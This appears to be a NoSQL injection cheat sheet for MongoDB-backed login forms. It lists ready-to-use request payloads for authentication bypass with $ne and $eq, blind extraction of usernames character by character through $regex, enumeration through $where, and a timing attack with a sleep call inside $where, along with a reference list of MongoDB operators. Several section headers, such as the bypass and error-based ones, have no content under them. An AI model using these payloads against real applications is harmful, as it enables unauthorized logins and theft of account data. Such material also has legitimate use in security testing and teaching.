## ========================================
## BOOLEAN-BASED INJECTION
## ========================================

# True conditions
username=admin&password[$ne]=wrong
username[$eq]=admin&password[$ne]=wrong

# Regex attack
username[$regex]=^a.*&password[$ne]=wrong

username[$regex]=^adm.*&password[$ne]=wrong

## ========================================
## MONGODB OPERATORS
## ========================================

# Comparison
$eq   // Equal
$ne   // Not equal
$gt   // Greater than
$gte  // Greater than or equal
$lt   // Less than
$lte  // Less than or equal
$in   // In array
$nin  // Not in array

# Logical
$and
$or
$not
$nor

# Element
$exists
$type

# Evaluation
$regex
$where

## ========================================
## BLIND NOSQL INJECTION
## ========================================

# Extract username length
username[$regex]=^.{1}$&password[$ne]=wrong  // False
username[$regex]=^.{2}$&password[$ne]=wrong  // False
username[$regex]=^.{5}$&password[$ne]=wrong  // True

# Extract characters
username[$regex]=^a.*&password[$ne]=wrong
username[$regex]=^ad.*&password[$ne]=wrong
username[$regex]=^adm.*&password[$ne]=wrong

# Script enumeration
username[$where]=this.username.length==5&password[$ne]=wrong

## ========================================
## BYPASS TECHNIQUES
## ========================================

# Different encoding

# Array syntax

# Nested operators

## ========================================
## ERROR-BASED INJECTION
## ========================================

## TIMING ATTACKS
## ========================================

# Conditional timing
{"$where": "if(this.password[0]=='a'){sleep(5000)}"}
